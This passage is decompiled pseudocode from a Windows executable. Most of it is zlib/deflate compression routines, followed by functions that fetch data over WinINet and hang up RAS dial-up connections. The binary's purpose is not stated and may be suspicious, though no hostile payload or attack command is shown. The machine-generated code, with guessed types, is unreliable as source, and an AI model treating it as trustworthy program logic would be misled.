    *(_WORD *)(a1 + 5808) = (unsigned __int16)v17 >> (16 - v22);
  }
  for ( i = 0; i < a4; ++i )
  {
    v24 = *(_DWORD *)(a1 + 5812);
    if ( v24 <= 13 )
    {
      *(_WORD *)(a1 + 5808) |= *(_WORD *)(a1 + 4 * (unsigned __int8)byte_41E6B4[i] + 2678) << v24;
      *(_DWORD *)(a1 + 5812) = v24 + 3;
    }
    else
    {
      v25 = *(_WORD *)(a1 + 4 * (unsigned __int8)byte_41E6B4[i] + 2678);
      v26 = v25 << v24;
      v27 = *(_DWORD *)(a1 + 20);
      *(_WORD *)(a1 + 5808) |= v26;
      *(_BYTE *)(v27 + *(_DWORD *)(a1 + 8)) = *(_BYTE *)(a1 + 5808);
      v28 = *(_DWORD *)(a1 + 8);
      v29 = *(_DWORD *)(a1 + 20) + 1;
      *(_DWORD *)(a1 + 20) = v29;
      *(_BYTE *)(v29 + v28) = *(_BYTE *)(a1 + 5809);
      v30 = *(_DWORD *)(a1 + 5812);
      ++*(_DWORD *)(a1 + 20);
      *(_DWORD *)(a1 + 5812) = v30 - 13;
      *(_WORD *)(a1 + 5808) = v25 >> (16 - v30);
    }
  }
  sub_406850(a1, a1 + 140, a2 - 1);
  return sub_406850(a1, a1 + 2432, a3 - 1);
}

//----- (00406850) --------------------------------------------------------
int __cdecl sub_406850(int a1, unsigned int a2, int a3)
{
  __int64 v3; // rax
  int v4; // ebx
  int v5; // ecx
  int v6; // esi
  int v7; // edi
  int v8; // ebp
  int v9; // ecx
  int v10; // esi
  int v11; // edi
  int v12; // ecx
  int v13; // ebx
  int v14; // edi
  int v15; // edi
  int v16; // ecx
  int v17; // esi
  int v18; // edi
  int v19; // ecx
  int v20; // ebx
  int v21; // edi
  int v22; // edi
  int v23; // ecx
  int v24; // esi
  int v25; // edi
  int v26; // ecx
  int v27; // ebx
  int v28; // edi
  int v29; // edi
  int v30; // ecx
  int v31; // esi
  int v32; // ecx
  int v33; // edi
  int v34; // esi
  int v35; // esi
  int v36; // ecx
  int v37; // ecx
  int v38; // esi
  int v39; // edi
  int v40; // ecx
  int v41; // ebx
  int v42; // edi
  int v43; // edi
  int v44; // ecx
  int v45; // esi
  int v46; // ecx
  int v47; // edi
  int v48; // esi
  int v49; // esi
  int v50; // ecx
  int v51; // esi
  int v52; // edi
  int v53; // ecx
  int v54; // ebx
  int v55; // edi
  int v56; // edi
  int v57; // ecx
  int v58; // esi
  int v59; // ecx
  int v60; // edi
  int v61; // esi
  int v62; // esi
  bool v63; // zf
  int v65; // [esp+Ch] [ebp-8h]
  int v66; // [esp+10h] [ebp-4h]
  int v67; // [esp+18h] [ebp+4h]
  int v68; // [esp+1Ch] [ebp+8h]
  unsigned __int16 *v69; // [esp+20h] [ebp+Ch]

  v3 = a2;
  v4 = *(unsigned __int16 *)(a2 + 2);
  v65 = -1;
  v5 = 7;
  v6 = 4;
  if ( !(_WORD)v4 )
  {
    v5 = 138;
    v6 = 3;
  }
  if ( a3 >= 0 )
  {
    v7 = a3 + 1;
    v69 = (unsigned __int16 *)(a2 + 6);
    LODWORD(v3) = a1;
    v66 = v7;
    do
    {
      v8 = v4;
      ++HIDWORD(v3);
      v4 = *v69;
      v67 = v4;
      v68 = HIDWORD(v3);
      if ( SHIDWORD(v3) < v5 && v8 == v4 )
        goto LABEL_44;
      if ( SHIDWORD(v3) < v6 )
      {
        do
        {
          v9 = *(_DWORD *)(v3 + 5812);
          v10 = *(unsigned __int16 *)(v3 + 4 * v8 + 2678);
          if ( v9 <= 16 - (unsigned __int16)v10 )
          {
            *(_WORD *)(v3 + 5808) |= *(_WORD *)(v3 + 4 * v8 + 2676) << v9;
            *(_DWORD *)(v3 + 5812) = v10 + v9;
          }
          else
          {
            WORD2(v3) = *(_WORD *)(v3 + 4 * v8 + 2676);
            v11 = WORD2(v3) << v9;
            v12 = *(_DWORD *)(v3 + 8);
            *(_WORD *)(v3 + 5808) |= v11;
            *(_BYTE *)(v12 + *(_DWORD *)(v3 + 20)) = *(_BYTE *)(v3 + 5808);
            v13 = *(_DWORD *)(v3 + 8);
            LOBYTE(v12) = *(_BYTE *)(v3 + 5809);
            v14 = *(_DWORD *)(v3 + 20) + 1;
            *(_DWORD *)(v3 + 20) = v14;
            *(_BYTE *)(v14 + v13) = v12;
            v15 = *(_DWORD *)(v3 + 5812);
            ++*(_DWORD *)(v3 + 20);
            *(_WORD *)(v3 + 5808) = WORD2(v3) >> (16 - v15);
            *(_DWORD *)(v3 + 5812) = v15 + v10 - 16;
            HIDWORD(v3) = v68;
          }
          v68 = --HIDWORD(v3);
        }
        while ( HIDWORD(v3) );
        goto LABEL_39;
      }
      if ( v8 )
      {
        if ( v8 != v65 )
        {
          v16 = *(_DWORD *)(v3 + 5812);
          v17 = *(unsigned __int16 *)(v3 + 4 * v8 + 2678);
          if ( v16 <= 16 - (unsigned __int16)v17 )
          {
            *(_WORD *)(v3 + 5808) |= *(_WORD *)(v3 + 4 * v8 + 2676) << v16;
            *(_DWORD *)(v3 + 5812) = v17 + v16;
          }
          else
          {
            WORD2(v3) = *(_WORD *)(v3 + 4 * v8 + 2676);
            v18 = WORD2(v3) << v16;
            v19 = *(_DWORD *)(v3 + 8);
            *(_WORD *)(v3 + 5808) |= v18;
            *(_BYTE *)(v19 + *(_DWORD *)(v3 + 20)) = *(_BYTE *)(v3 + 5808);
            v20 = *(_DWORD *)(v3 + 8);
            LOBYTE(v19) = *(_BYTE *)(v3 + 5809);
            v21 = *(_DWORD *)(v3 + 20) + 1;
            *(_DWORD *)(v3 + 20) = v21;
            *(_BYTE *)(v21 + v20) = v19;
            v22 = *(_DWORD *)(v3 + 5812);
            ++*(_DWORD *)(v3 + 20);
            *(_WORD *)(v3 + 5808) = WORD2(v3) >> (16 - v22);
            *(_DWORD *)(v3 + 5812) = v22 + v17 - 16;
            HIDWORD(v3) = v68;
          }
          v68 = --HIDWORD(v3);
        }
        v23 = *(_DWORD *)(v3 + 5812);
        v24 = *(unsigned __int16 *)(v3 + 2742);
        if ( v23 <= 16 - (unsigned __int16)v24 )
        {
          *(_WORD *)(v3 + 5808) |= *(_WORD *)(v3 + 2740) << v23;
          *(_DWORD *)(v3 + 5812) = v24 + v23;
        }
        else
        {
          WORD2(v3) = *(_WORD *)(v3 + 2740);
          v25 = WORD2(v3) << v23;
          v26 = *(_DWORD *)(v3 + 8);
          *(_WORD *)(v3 + 5808) |= v25;
          *(_BYTE *)(v26 + *(_DWORD *)(v3 + 20)) = *(_BYTE *)(v3 + 5808);
          v27 = *(_DWORD *)(v3 + 8);
          LOBYTE(v26) = *(_BYTE *)(v3 + 5809);
          v28 = *(_DWORD *)(v3 + 20) + 1;
          *(_DWORD *)(v3 + 20) = v28;
          *(_BYTE *)(v28 + v27) = v26;
          v29 = *(_DWORD *)(v3 + 5812);
          ++*(_DWORD *)(v3 + 20);
          *(_WORD *)(v3 + 5808) = WORD2(v3) >> (16 - v29);
          *(_DWORD *)(v3 + 5812) = v29 + v24 - 16;
          HIDWORD(v3) = v68;
        }
        v30 = *(_DWORD *)(v3 + 5812);
        if ( v30 > 14 )
        {
          HIDWORD(v3) -= 3;
          v31 = HIDWORD(v3) << v30;
          v32 = *(_DWORD *)(v3 + 8);
          *(_WORD *)(v3 + 5808) |= v31;
          *(_BYTE *)(v32 + *(_DWORD *)(v3 + 20)) = *(_BYTE *)(v3 + 5808);
          v33 = *(_DWORD *)(v3 + 8);
          LOBYTE(v32) = *(_BYTE *)(v3 + 5809);
          v34 = *(_DWORD *)(v3 + 20) + 1;
          *(_DWORD *)(v3 + 20) = v34;
          *(_BYTE *)(v34 + v33) = v32;
          v35 = *(_DWORD *)(v3 + 5812);
          ++*(_DWORD *)(v3 + 20);
          *(_DWORD *)(v3 + 5812) = v35 - 14;
          *(_WORD *)(v3 + 5808) = WORD2(v3) >> (16 - v35);
          goto LABEL_39;
        }
        *(_WORD *)(v3 + 5808) |= (HIDWORD(v3) - 3) << v30;
        v36 = v30 + 2;
      }
      else if ( SHIDWORD(v3) > 10 )
      {
        v50 = *(_DWORD *)(v3 + 5812);
        v51 = *(unsigned __int16 *)(v3 + 2750);
        if ( v50 <= 16 - (unsigned __int16)v51 )
        {
          *(_WORD *)(v3 + 5808) |= *(_WORD *)(v3 + 2748) << v50;
          *(_DWORD *)(v3 + 5812) = v51 + v50;
        }
        else
        {
          WORD2(v3) = *(_WORD *)(v3 + 2748);
          v52 = WORD2(v3) << v50;
          v53 = *(_DWORD *)(v3 + 8);
          *(_WORD *)(v3 + 5808) |= v52;
          *(_BYTE *)(v53 + *(_DWORD *)(v3 + 20)) = *(_BYTE *)(v3 + 5808);
          v54 = *(_DWORD *)(v3 + 8);
          LOBYTE(v53) = *(_BYTE *)(v3 + 5809);
          v55 = *(_DWORD *)(v3 + 20) + 1;
          *(_DWORD *)(v3 + 20) = v55;
          *(_BYTE *)(v55 + v54) = v53;
          v56 = *(_DWORD *)(v3 + 5812);
          ++*(_DWORD *)(v3 + 20);
          *(_WORD *)(v3 + 5808) = WORD2(v3) >> (16 - v56);
          *(_DWORD *)(v3 + 5812) = v56 + v51 - 16;
          HIDWORD(v3) = v68;
        }
        v57 = *(_DWORD *)(v3 + 5812);
        if ( v57 > 9 )
        {
          HIDWORD(v3) -= 11;
          v58 = HIDWORD(v3) << v57;
          v59 = *(_DWORD *)(v3 + 8);
          *(_WORD *)(v3 + 5808) |= v58;
          *(_BYTE *)(v59 + *(_DWORD *)(v3 + 20)) = *(_BYTE *)(v3 + 5808);
          v60 = *(_DWORD *)(v3 + 8);
          LOBYTE(v59) = *(_BYTE *)(v3 + 5809);
          v61 = *(_DWORD *)(v3 + 20) + 1;
          *(_DWORD *)(v3 + 20) = v61;
          *(_BYTE *)(v61 + v60) = v59;
          v62 = *(_DWORD *)(v3 + 5812);
          ++*(_DWORD *)(v3 + 20);
          *(_DWORD *)(v3 + 5812) = v62 - 9;
          *(_WORD *)(v3 + 5808) = WORD2(v3) >> (16 - v62);
          goto LABEL_39;
        }
        *(_WORD *)(v3 + 5808) |= (HIDWORD(v3) - 11) << v57;
        v36 = v57 + 7;
      }
      else
      {
        v37 = *(_DWORD *)(v3 + 5812);
        v38 = *(unsigned __int16 *)(v3 + 2746);
        if ( v37 <= 16 - (unsigned __int16)v38 )
        {
          *(_WORD *)(v3 + 5808) |= *(_WORD *)(v3 + 2744) << v37;
          *(_DWORD *)(v3 + 5812) = v38 + v37;
        }
        else
        {
          WORD2(v3) = *(_WORD *)(v3 + 2744);
          v39 = WORD2(v3) << v37;
          v40 = *(_DWORD *)(v3 + 8);
          *(_WORD *)(v3 + 5808) |= v39;
          *(_BYTE *)(v40 + *(_DWORD *)(v3 + 20)) = *(_BYTE *)(v3 + 5808);
          v41 = *(_DWORD *)(v3 + 8);
          LOBYTE(v40) = *(_BYTE *)(v3 + 5809);
          v42 = *(_DWORD *)(v3 + 20) + 1;
          *(_DWORD *)(v3 + 20) = v42;
          *(_BYTE *)(v42 + v41) = v40;
          v43 = *(_DWORD *)(v3 + 5812);
          ++*(_DWORD *)(v3 + 20);
          *(_WORD *)(v3 + 5808) = WORD2(v3) >> (16 - v43);
          *(_DWORD *)(v3 + 5812) = v43 + v38 - 16;
          HIDWORD(v3) = v68;
        }
        v44 = *(_DWORD *)(v3 + 5812);
        if ( v44 > 13 )
        {
          HIDWORD(v3) -= 3;
          v45 = HIDWORD(v3) << v44;
          v46 = *(_DWORD *)(v3 + 8);
          *(_WORD *)(v3 + 5808) |= v45;
          *(_BYTE *)(v46 + *(_DWORD *)(v3 + 20)) = *(_BYTE *)(v3 + 5808);
          v47 = *(_DWORD *)(v3 + 8);
          LOBYTE(v46) = *(_BYTE *)(v3 + 5809);
          v48 = *(_DWORD *)(v3 + 20) + 1;
          *(_DWORD *)(v3 + 20) = v48;
          *(_BYTE *)(v48 + v47) = v46;
          v49 = *(_DWORD *)(v3 + 5812);
          ++*(_DWORD *)(v3 + 20);
          *(_DWORD *)(v3 + 5812) = v49 - 13;
          *(_WORD *)(v3 + 5808) = WORD2(v3) >> (16 - v49);
          goto LABEL_39;
        }
        *(_WORD *)(v3 + 5808) |= (HIDWORD(v3) - 3) << v44;
        v36 = v44 + 3;
      }
      *(_DWORD *)(v3 + 5812) = v36;
LABEL_39:
      v4 = v67;
      HIDWORD(v3) = 0;
      v65 = v8;
      if ( v67 )
      {
        if ( v8 == v67 )
        {
          v5 = 6;
          v6 = 3;
        }
        else
        {
          v5 = 7;
          v6 = 4;
        }
      }
      else
      {
        v5 = 138;
        v6 = 3;
      }
LABEL_44:
      v63 = v66 == 1;
      v69 += 2;
      --v66;
    }
    while ( !v63 );
  }
  return v3;
}

//----- (00406DD0) --------------------------------------------------------
int __cdecl sub_406DD0(int a1, int a2, int a3)
{
  int result; // eax
  unsigned int v4; // ecx
  int v5; // ebp
  int v6; // edi
  int v7; // edx
  int v8; // ecx
  unsigned __int16 v9; // si
  int v10; // edx
  int v11; // ecx
  int v12; // ebx
  int v13; // edx
  int v14; // edx
  int v15; // ecx
  int v16; // ecx
  int v17; // ebx
  int v18; // esi
  unsigned __int16 v19; // si
  int v20; // ebp
  int v21; // ebx
  char v22; // cl
  int v23; // ebx
  __int16 v24; // si
  int v25; // ecx
  __int16 v26; // bp
  int v27; // ecx
  int v28; // esi
  int v29; // edx
  int v30; // ecx
  int v31; // ebp
  int v32; // ebx
  char v33; // cl
  int v34; // ebx
  unsigned int v35; // edi
  int v36; // ebx
  int v37; // ecx
  int v38; // esi
  unsigned __int16 v39; // dx
  int v40; // ebp
  int v41; // ebx
  char v42; // cl
  int v43; // ebx
  int v44; // edx
  int v45; // edx
  unsigned int v46; // edi
  int v47; // ecx
  unsigned int v48; // esi
  int v49; // ecx
  int v50; // ebx
  int v51; // esi
  int v52; // esi
  int v53; // ecx
  int v54; // esi
  unsigned __int16 v55; // dx
  int v56; // edi
  int v57; // ecx
  int v58; // ebx
  int v59; // edi
  int v60; // edi
  int v61; // [esp+10h] [ebp-8h]
  unsigned int v62; // [esp+14h] [ebp-4h]
  int v63; // [esp+1Ch] [ebp+4h]
  int v64; // [esp+1Ch] [ebp+4h]

  result = a1;
  v4 = 0;
  v5 = a2;
  if ( *(_DWORD *)(a1 + 5784) )
  {
    while ( 1 )
    {
      v6 = *(unsigned __int16 *)(*(_DWORD *)(result + 5788) + 2 * v4);
      v7 = *(unsigned __int8 *)(v4 + *(_DWORD *)(result + 5776));
      v62 = v4 + 1;
      if ( !(_WORD)v6 )
        break;
      v16 = *(_DWORD *)(result + 5812);
      v17 = (unsigned __int8)byte_41EDC0[v7];
      v63 = v17;
      v18 = *(unsigned __int16 *)(v5 + 4 * v17 + 1030);
      v61 = (unsigned __int16)v18;
      if ( v16 <= 16 - (unsigned __int16)v18 )
      {
        v26 = *(_WORD *)(a2 + 4 * v17 + 1028) << v16;
        v27 = *(_DWORD *)(result + 5812);
        *(_WORD *)(result + 5808) |= v26;
        v25 = v18 + v27;
      }
      else
      {
        v19 = *(_WORD *)(a2 + 4 * v17 + 1028);
        v20 = *(_DWORD *)(result + 8);
        *(_WORD *)(result + 5808) |= v19 << v16;
        *(_BYTE *)(*(_DWORD *)(result + 20) + v20) = *(_BYTE *)(result + 5808);
        v21 = *(_DWORD *)(result + 20) + 1;
        v22 = *(_BYTE *)(result + 5809);
        *(_DWORD *)(result + 20) = v21;
        *(_BYTE *)(*(_DWORD *)(result + 8) + v21) = v22;
        v23 = *(_DWORD *)(result + 5812);
        ++*(_DWORD *)(result + 20);
        v24 = v19 >> (16 - v23);
        v25 = v23 + v61 - 16;
        v17 = v63;
        *(_WORD *)(result + 5808) = v24;
      }
      *(_DWORD *)(result + 5812) = v25;
      v28 = dword_41E57C[v17];
      if ( v28 )
      {
        v29 = v7 - dword_41EEC0[v17];
        v30 = *(_DWORD *)(result + 5812);
        if ( v30 <= 16 - v28 )
        {
          *(_WORD *)(result + 5808) |= v29 << v30;
          *(_DWORD *)(result + 5812) = v28 + v30;
        }
        else
        {
          v31 = *(_DWORD *)(result + 8);
          *(_WORD *)(result + 5808) |= v29 << v30;
          *(_BYTE *)(*(_DWORD *)(result + 20) + v31) = *(_BYTE *)(result + 5808);
          v32 = *(_DWORD *)(result + 20) + 1;
          v33 = *(_BYTE *)(result + 5809);
          *(_DWORD *)(result + 20) = v32;
          *(_BYTE *)(*(_DWORD *)(result + 8) + v32) = v33;
          v34 = *(_DWORD *)(result + 5812);
          ++*(_DWORD *)(result + 20);
          *(_WORD *)(result + 5808) = (unsigned __int16)v29 >> (16 - v34);
          *(_DWORD *)(result + 5812) = v34 + v28 - 16;
        }
      }
      v35 = v6 - 1;
      if ( v35 >= 0x100 )
        v36 = (unsigned __int8)byte_41ECC0[v35 >> 7];
      else
        v36 = (unsigned __int8)byte_41EBC0[v35];
      v37 = *(_DWORD *)(result + 5812);
      v38 = *(unsigned __int16 *)(a3 + 4 * v36 + 2);
      v64 = v36;
      if ( v37 <= 16 - (unsigned __int16)v38 )
      {
        v5 = a2;
        *(_WORD *)(result + 5808) |= *(_WORD *)(a3 + 4 * v36) << v37;
        *(_DWORD *)(result + 5812) = v38 + v37;
      }
      else
      {
        v39 = *(_WORD *)(a3 + 4 * v36);
        v40 = *(_DWORD *)(result + 8);
        *(_WORD *)(result + 5808) |= v39 << v37;
        *(_BYTE *)(*(_DWORD *)(result + 20) + v40) = *(_BYTE *)(result + 5808);
        v41 = *(_DWORD *)(result + 20) + 1;
        v42 = *(_BYTE *)(result + 5809);
        *(_DWORD *)(result + 20) = v41;
        *(_BYTE *)(*(_DWORD *)(result + 8) + v41) = v42;
        v43 = *(_DWORD *)(result + 5812);
        ++*(_DWORD *)(result + 20);
        v5 = a2;
        *(_WORD *)(result + 5808) = v39 >> (16 - v43);
        v44 = v43 + v38 - 16;
        v36 = v64;
        *(_DWORD *)(result + 5812) = v44;
      }
      v45 = dword_41E5F0[v36];
      if ( !v45 )
        goto LABEL_24;
      v46 = v35 - dword_41EF34[v36];
      v47 = *(_DWORD *)(result + 5812);
      if ( v47 <= 16 - v45 )
      {
        *(_WORD *)(result + 5808) |= v46 << v47;
        v15 = v45 + v47;
LABEL_23:
        *(_DWORD *)(result + 5812) = v15;
        goto LABEL_24;
      }
      v48 = v46 << v47;
      v49 = *(_DWORD *)(result + 8);
      *(_WORD *)(result + 5808) |= v48;
      *(_BYTE *)(v49 + *(_DWORD *)(result + 20)) = *(_BYTE *)(result + 5808);
      v50 = *(_DWORD *)(result + 8);
      LOBYTE(v49) = *(_BYTE *)(result + 5809);
      v51 = *(_DWORD *)(result + 20) + 1;
      *(_DWORD *)(result + 20) = v51;
      *(_BYTE *)(v51 + v50) = v49;
      v52 = *(_DWORD *)(result + 5812);
      ++*(_DWORD *)(result + 20);
      *(_DWORD *)(result + 5812) = v52 + v45 - 16;
      *(_WORD *)(result + 5808) = (unsigned __int16)v46 >> (16 - v52);
LABEL_24:
      v4 = v62;
      if ( v62 >= *(_DWORD *)(result + 5784) )
        goto LABEL_25;
    }
    LOWORD(v6) = *(_WORD *)(v5 + 4 * v7 + 2);
    v8 = *(_DWORD *)(result + 5812);
    if ( v8 <= 16 - (unsigned __int16)v6 )
    {
      *(_WORD *)(result + 5808) |= *(_WORD *)(v5 + 4 * v7) << v8;
      v15 = v6 + v8;
    }
    else
    {
      v9 = *(_WORD *)(v5 + 4 * v7);
      v10 = v9 << v8;
      v11 = *(_DWORD *)(result + 8);
      *(_WORD *)(result + 5808) |= v10;
      *(_BYTE *)(v11 + *(_DWORD *)(result + 20)) = *(_BYTE *)(result + 5808);
      v12 = *(_DWORD *)(result + 8);
      v13 = *(_DWORD *)(result + 20) + 1;
      *(_DWORD *)(result + 20) = v13;
      *(_BYTE *)(v13 + v12) = *(_BYTE *)(result + 5809);
      v14 = *(_DWORD *)(result + 5812);
      ++*(_DWORD *)(result + 20);
      v15 = v14 + v6 - 16;
      *(_WORD *)(result + 5808) = v9 >> (16 - v14);
    }
    goto LABEL_23;
  }
LABEL_25:
  v53 = *(_DWORD *)(result + 5812);
  v54 = *(unsigned __int16 *)(v5 + 1026);
  if ( v53 <= 16 - (unsigned __int16)v54 )
  {
    *(_WORD *)(result + 5808) |= *(_WORD *)(v5 + 1024) << v53;
    *(_DWORD *)(result + 5812) = v54 + v53;
  }
  else
  {
    v55 = *(_WORD *)(v5 + 1024);
    v56 = v55 << v53;
    v57 = *(_DWORD *)(result + 8);
    *(_WORD *)(result + 5808) |= v56;
    *(_BYTE *)(v57 + *(_DWORD *)(result + 20)) = *(_BYTE *)(result + 5808);
    v58 = *(_DWORD *)(result + 8);
    LOBYTE(v57) = *(_BYTE *)(result + 5809);
    v59 = *(_DWORD *)(result + 20) + 1;
    *(_DWORD *)(result + 20) = v59;
    *(_BYTE *)(v59 + v58) = v57;
    v60 = *(_DWORD *)(result + 5812);
    ++*(_DWORD *)(result + 20);
    *(_WORD *)(result + 5808) = v55 >> (16 - v60);
    *(_DWORD *)(result + 5812) = v60 + v54 - 16;
  }
  *(_DWORD *)(result + 5804) = *(unsigned __int16 *)(v5 + 1026);
  return result;
}
// 41E57C: using guessed type int dword_41E57C[29];
// 41E5F0: using guessed type int dword_41E5F0[];
// 41EEC0: using guessed type int dword_41EEC0[29];
// 41EF34: using guessed type int dword_41EF34[171];

//----- (00407210) --------------------------------------------------------
BOOL __cdecl sub_407210(int a1)
{
  unsigned int v1; // edi
  unsigned int v2; // edx
  unsigned __int16 *v3; // eax
  int v4; // ecx
  unsigned __int16 v5; // si
  unsigned __int16 *v6; // eax
  int v7; // ecx
  unsigned __int16 v8; // bp
  unsigned __int16 *v9; // ecx
  int v10; // eax
  unsigned __int16 v11; // si
  unsigned int v12; // edi
  BOOL result; // eax

  v1 = 0;
  v2 = 0;
  v3 = (unsigned __int16 *)(a1 + 140);
  v4 = 7;
  do
  {
    v5 = *v3;
    v3 += 2;
    v2 += v5;
    --v4;
  }
  while ( v4 );
  v6 = (unsigned __int16 *)(a1 + 168);
  v7 = 121;
  do
  {
    v8 = *v6;
    v6 += 2;
    v1 += v8;
    --v7;
  }
  while ( v7 );
  v9 = (unsigned __int16 *)(a1 + 652);
  v10 = 128;
  do
  {
    v11 = *v9;
    v9 += 2;
    v2 += v11;
    --v10;
  }
  while ( v10 );
  v12 = v1 >> 2;
  result = v2 <= v12;
  *(_BYTE *)(a1 + 28) = v2 <= v12;
  return result;
}

//----- (00407290) --------------------------------------------------------
unsigned int __cdecl sub_407290(unsigned int a1, int a2)
{
  unsigned int v4; // eax
  int v5; // esi

  v4 = 0;
  do
  {
    v5 = a1 & 1;
    a1 >>= 1;
    v4 = 2 * (v5 | v4);
    --a2;
  }
  while ( a2 > 0 );
  return v4 >> 1;
}

//----- (004072B0) --------------------------------------------------------
int __cdecl sub_4072B0(int a1)
{
  int result; // eax
  int v2; // edx
  int v3; // esi
  int v4; // edx

  result = a1;
  v2 = *(_DWORD *)(a1 + 5812);
  if ( v2 <= 8 )
  {
    if ( v2 > 0 )
      *(_BYTE *)(*(_DWORD *)(a1 + 8) + (*(_DWORD *)(a1 + 20))++) = *(_BYTE *)(a1 + 5808);
    *(_WORD *)(a1 + 5808) = 0;
    *(_DWORD *)(a1 + 5812) = 0;
  }
  else
  {
    *(_BYTE *)(*(_DWORD *)(a1 + 8) + *(_DWORD *)(a1 + 20)) = *(_BYTE *)(a1 + 5808);
    v3 = *(_DWORD *)(a1 + 8);
    v4 = *(_DWORD *)(a1 + 20) + 1;
    *(_DWORD *)(a1 + 20) = v4;
    *(_BYTE *)(v3 + v4) = *(_BYTE *)(a1 + 5809);
    ++*(_DWORD *)(a1 + 20);
    *(_WORD *)(a1 + 5808) = 0;
    *(_DWORD *)(a1 + 5812) = 0;
  }
  return result;
}

//----- (00407330) --------------------------------------------------------
_BYTE *__cdecl sub_407330(_DWORD *a1, _BYTE *a2, int a3, int a4)
{
  int v4; // edi
  int v5; // edx
  int v6; // edi
  int v7; // ecx
  int v8; // edi
  int v9; // ecx
  _BYTE *result; // eax
  int v11; // ecx

  sub_4072B0((int)a1);
  a1[1451] = 8;
  if ( a4 )
  {
    *(_BYTE *)(a1[5] + a1[2]) = a3;
    v4 = a1[2];
    v5 = a1[5] + 1;
    a1[5] = v5;
    *(_BYTE *)(v5 + v4) = BYTE1(a3);
    v6 = a1[2];
    v7 = a1[5] + 1;
    a1[5] = v7;
    *(_BYTE *)(v7 + v6) = ~(_BYTE)a3;
    v8 = a1[5] + 1;
    v9 = a1[2];
    a1[5] = v8;
    *(_BYTE *)(v8 + v9) = ~BYTE1(a3);
    ++a1[5];
  }
  result = (_BYTE *)(a3 - 1);
  if ( a3 )
  {
    v11 = a3;
    result = a2;
    do
    {
      *(_BYTE *)(a1[5] + a1[2]) = *result++;
      --v11;
      ++a1[5];
    }
    while ( v11 );
  }
  return result;
}

//----- (004073E0) --------------------------------------------------------
void sub_4073E0()
{
  dword_4366E0 = (int)&unk_4366E8;
}
// 4366E0: using guessed type int dword_4366E0;

//----- (004073F0) --------------------------------------------------------
int __cdecl sub_4073F0(_DWORD *a1, int a2, LPCSTR *a3)
{
  _DWORD *v3; // eax
  int v5[4]; // [esp+0h] [ebp-14h] BYREF
  unsigned int v6; // [esp+10h] [ebp-4h]

  sub_407DB0(v5);
  sub_407960((HINTERNET *)(dword_4366E0 + 168), *a3, v5);
  v3 = sub_407710(v6 != 0 ? (const void *)v5[2] : 0, v6);
  v5[0] = (int)&off_41F1E0;
  *a1 = v3;
  return sub_407FB0((int)v5);
}
// 41F1E0: using guessed type void *off_41F1E0;
// 4366E0: using guessed type int dword_4366E0;

//----- (00407450) --------------------------------------------------------
DWORD __cdecl sub_407450(HRASCONN a1)
{
  DWORD TickCount; // edi
  DWORD result; // eax
  int v3[40]; // [esp+10h] [ebp-A0h] BYREF

  RasHangUpA(a1);
  memset(v3, 0, sizeof(v3));
  v3[0] = 160;
  TickCount = GetTickCount();
  for ( result = GetTickCount() - TickCount; result < 0xBB8; result = GetTickCount() - TickCount )
  {
    result = RasGetConnectStatusA(a1, (struct tagRASCONNSTATUSA *)v3);
    if ( result == 6 )
      break;
    Sleep(0);
  }
  return result;
}

//----- (004074D0) --------------------------------------------------------
_DWORD *__thiscall sub_4074D0(_DWORD *this)
{
  sub_4091A0(this);
  sub_408810(this + 15);
  sub_4077A0(this + 42);
  this[47] = 0;
  this[48] = 0;
  sub_4075C0();
  return this;
}

//----- (00407550) --------------------------------------------------------
int __thiscall sub_407550(SOCKET *this)
{
  sub_4075D0((int)this);
  sub_4077D0((CDaoRecordset *)(this + 42));
  sub_408890((int)(this + 15));
  return sub_409210(this);
}

//----- (004075C0) --------------------------------------------------------
BOOL sub_4075C0()
{
  return sub_41C98D(0) != 0;
}

//----- (004075D0) --------------------------------------------------------
int __thiscall sub_4075D0(int this)
{
  int v2; // edi
  HRASCONN v3; // edx
  int v5[40]; // [esp+8h] [ebp-A0h] BYREF

  v2 = this + 60;
  sub_408A70((void **)(this + 60));
  sub_408B20(v2);
  sub_409290((SOCKET *)this);
  CDaoRecordset::ResetCursor((CDaoRecordset *)(this + 168));
  v3 = *(HRASCONN *)(this + 188);
  if ( v3 )
  {
    *(_DWORD *)(this + 192) = 0;
    memset(v5, 0, sizeof(v5));
    v5[0] = 160;
    if ( RasGetConnectStatusA(v3, (struct tagRASCONNSTATUSA *)v5) || v5[1] != 0x2000 )
      sub_407450(*(HRASCONN *)(this + 188));
    *(_DWORD *)(this + 188) = 0;
  }
  return 0;
}

//----- (00407670) --------------------------------------------------------
int sub_407670()
{
  unknown_libname_8();
  return atexit(unknown_libname_9);
}
// 407680: using guessed type int unknown_libname_8(void);

//----- (004076B0) --------------------------------------------------------
int __stdcall sub_4076B0(int a1, int a2, int a3)
{
  int result; // eax

  result = 0;
  if ( a1 != 1 )
    return -1;
  dword_4367B0 = a2;
  return result;
}
// 4367B0: using guessed type int dword_4367B0;

//----- (004076D0) --------------------------------------------------------
int __stdcall sub_4076D0(int a1, int a2, int a3)
{
  int result; // eax

  if ( dword_4367B0 )
  {
    result = dword_4367B0(a1, a2, a3);
    dword_4367AC = result;
  }
  else
  {
    dword_4367AC = 0;
    return 0;
  }
  return result;
}
// 4367B0: invalid function type '?' has been ignored
// 4367AC: using guessed type int dword_4367AC;
// 4367B0: using guessed type int (__stdcall *dword_4367B0)(_DWORD, _DWORD, _DWORD);

//----- (00407710) --------------------------------------------------------
_DWORD *__cdecl sub_407710(const void *a1, unsigned int a2)
{
  _DWORD *result; // eax

  if ( !a2 )
    return 0;
  result = (_DWORD *)sub_4076D0(2024, a2 + 8, 0);
  result[1] = a2;
  *result = 1;
  qmemcpy(result + 2, a1, a2);
  return result;
}

//----- (00407760) --------------------------------------------------------
int __stdcall sub_407760(int a1, int a2, int a3)
{
  return sub_4076B0(a1, a2, a3);
}

//----- (00407790) --------------------------------------------------------
void sub_407790()
{
  dword_4367B4 = (int)&unk_4366E8;
}
// 4367B4: using guessed type int dword_4367B4;

//----- (004077A0) --------------------------------------------------------
_DWORD *__thiscall sub_4077A0(_DWORD *this)
{
  _DWORD *result; // eax

  result = this;
  this[1] = off_42667C;
  this[2] = off_42667C;
  this[3] = off_42667C;
  *this = 0;
  return result;
}
// 42667C: using guessed type void *off_42667C;

//----- (004077D0) --------------------------------------------------------
void __thiscall sub_4077D0(CDaoRecordset *this)
{
  CDaoRecordset::ResetCursor(this);
  sub_41691E((_DWORD *)this + 3);
  sub_41691E((_DWORD *)this + 2);
  sub_41691E((_DWORD *)this + 1);
}

//----- (00407840) --------------------------------------------------------
BOOL __thiscall sub_407840(HINTERNET *this)
{
  if ( !*this )
    *this = InternetOpenA(
              szAgent,
